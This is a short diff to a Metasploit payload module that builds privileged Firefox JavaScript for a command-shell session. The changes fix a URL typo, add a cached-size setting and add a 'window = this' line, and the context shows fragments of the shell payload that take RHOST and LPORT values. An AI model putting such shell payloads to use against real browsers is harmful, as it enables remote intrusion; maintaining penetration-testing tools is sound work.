@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -9,6 +9,8 @@ require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
 module Metasploit3
+
+  CachedSize = :dynamic
 
   include Msf::Payload::Single
   include Msf::Payload::Firefox
@@ -34,6 +36,7 @@ module Metasploit3
   def generate
     %Q|
     (function(){
+      window = this;
       Components.utils.import("resource://gre/modules/NetUtil.jsm");
       var lport = #{datastore["LPORT"]};
       var rhost = "#{datastore['RHOST']}";
